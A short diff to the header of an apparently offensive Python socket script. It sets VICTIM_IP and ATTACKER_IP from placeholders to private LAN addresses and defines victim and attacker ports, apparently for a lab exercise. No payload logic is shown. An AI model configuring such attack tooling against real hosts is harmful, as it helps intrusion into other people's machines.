@@ -1,9 +1,9 @@
 #!/usr/bin/env python
 
-VICTIM_IP = '255.255.255.255'
+VICTIM_IP = '192.168.1.7'
 VICTIM_PORT = 4000
 
-ATTACKER_IP = '255.255.255.255'
+ATTACKER_IP = '192.168.1.4'
 ATTACKER_PORT = 5000
 
 from socket import *
